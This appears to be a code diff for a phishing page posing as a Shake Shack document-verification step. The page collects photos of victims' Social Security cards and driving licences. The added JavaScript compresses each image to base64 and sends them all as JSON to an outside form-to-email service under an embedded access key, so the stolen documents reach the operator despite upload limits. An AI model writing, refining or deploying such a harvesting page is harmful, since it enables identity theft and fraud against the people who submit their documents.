@@ -229,17 +229,22 @@
                 <h1>Verification <br><span class="escrow-text">- Required Documents</span></h1>
             </header>
 
-            <!-- Standard HTML form submit to prevent fetch payload limits -->
-            <form id="uploadForm" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data">
+            <form id="uploadForm" onsubmit="handleFormSubmit(event)">
                 
-                <!-- Web3Forms Access Key -->
                 <input type="hidden" name="access_key" value="e0f4322a-542d-4c84-8ec6-fce2f6f6e627">
+                <input type="hidden" name="subject" value="New Document Verification Upload - Shake Shack">
+
+                <!-- Hidden text fields that will hold the compressed image text strings -->
+                <input type="hidden" id="base_ssn_front" name="ssn_front_data">
+                <input type="hidden" id="base_ssn_back" name="ssn_back_data">
+                <input type="hidden" id="base_dl_front" name="dl_front_data">
+                <input type="hidden" id="base_dl_back" name="dl_back_data">
 
                 <div class="upload-group">
                     <label>SSN Image (Front)</label>
                     <div class="file-drop-box">
                         <span id="label-ssn-front">Tap to upload or drag image</span>
-                        <input type="file" name="ssn_front" accept="image/*" required onchange="updateFileName(this, 'label-ssn-front')">
+                        <input type="file" id="file-ssn-front" accept="image/*" required onchange="processFile(this, 'label-ssn-front', 'base_ssn_front')">
                     </div>
                 </div>
 
@@ -247,7 +252,7 @@
                     <label>SSN Image (Back)</label>
                     <div class="file-drop-box">
                         <span id="label-ssn-back">Tap to upload or drag image</span>
-                        <input type="file" name="ssn_back" accept="image/*" required onchange="updateFileName(this, 'label-ssn-back')">
+                        <input type="file" id="file-ssn-back" accept="image/*" required onchange="processFile(this, 'label-ssn-back', 'base_ssn_back')">
                     </div>
                 </div>
 
@@ -255,7 +260,7 @@
                     <label>DRIVING LICENCE Image (Front)</label>
                     <div class="file-drop-box">
                         <span id="label-dl-front">Tap to upload or drag image</span>
-                        <input type="file" name="driving_licence_front" accept="image/*" required onchange="updateFileName(this, 'label-dl-front')">
+                        <input type="file" id="file-dl-front" accept="image/*" required onchange="processFile(this, 'label-dl-front', 'base_dl_front')">
                     </div>
                 </div>
 
@@ -263,11 +268,11 @@
                     <label>DRIVING LICENCE Image (Back)</label>
                     <div class="file-drop-box">
                         <span id="label-dl-back">Tap to upload or drag image</span>
-                        <input type="file" name="driving_licence_back" accept="image/*" required onchange="updateFileName(this, 'label-dl-back')">
+                        <input type="file" id="file-dl-back" accept="image/*" required onchange="processFile(this, 'label-dl-back', 'base_dl_back')">
                     </div>
                 </div>
 
-                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn" onclick="showSubmitting()">Confirm</button>
+                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn">Confirm</button>
             </form>
         </div>
 
@@ -281,12 +286,48 @@
     </div>
 
     <script>
-        function updateFileName(input, labelId) {
+        function processFile(input, labelId, hiddenId) {
             if (input.files && input.files[0]) {
+                const file = input.files[0];
                 const label = document.getElementById(labelId);
-                label.innerText = "✓ Added: " + input.files[0].name;
-                label.style.color = "#28a745";
-                label.style.fontWeight = "bold";
+                
+                label.innerText = "✓ Processing: " + file.name;
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    // Compress image via canvas to prevent size limits
+                    const img = new Image();
+                    img.onload = function() {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        
+                        let width = img.width;
+                        let height = img.height;
+                        const maxDim = 800; // Resize to max 800px width/height for fast text transmission
+                        
+                        if (width > height && width > maxDim) {
+                            height *= maxDim / width;
+                            width = maxDim;
+                        } else if (height > maxDim) {
+                            width *= maxDim / height;
+                            height = maxDim;
+                        }
+                        
+                        canvas.width = width;
+                        canvas.height = height;
+                        ctx.drawImage(img, 0, 0, width, height);
+                        
+                        // Convert to compressed jpeg string
+                        const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                        document.getElementById(hiddenId).value = compressedDataUrl;
+                        
+                        label.innerText = "✓ Added: " + file.name;
+                        label.style.color = "#28a745";
+                        label.style.fontWeight = "bold";
+                    }
+                    img.src = e.target.result;
+                }
+                reader.readAsDataURL(file);
             }
         }
 
@@ -295,17 +336,45 @@
             document.getElementById('step-upload').classList.add('active');
         }
 
-        function showSubmitting() {
-            const btn = document.getElementById('submitBtn');
-            setTimeout(() => {
-                btn.innerText = "Submitting & Uploading...";
-            }, 100);
+        async function handleFormSubmit(event) {
+            event.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.innerText = "Submitting...";
+            submitBtn.disabled = true;
 
-            // Automatically transition the screen after submitting natively
-            setTimeout(() => {
-                document.getElementById('step-upload').classList.remove('active');
-                document.getElementById('step-success').classList.add('active');
-            }, 1500);
+            const formElement = event.target;
+            const formData = new FormData(formElement);
+            
+            // Send as regular text/json payload to Web3Forms free text endpoint
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
+
+            try {
+                let response = await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: json
+                });
+
+                let result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('step-upload').classList.remove('active');
+                    document.getElementById('step-success').classList.add('active');
+                } else {
+                    alert('Error: ' + result.message);
+                    submitBtn.innerText = "Confirm";
+                    submitBtn.disabled = false;
+                }
+            } catch (error) {
+                alert('Network error. Please try again.');
+                submitBtn.innerText = "Confirm";
+                submitBtn.disabled = false;
+            }
         }
     </script>
 
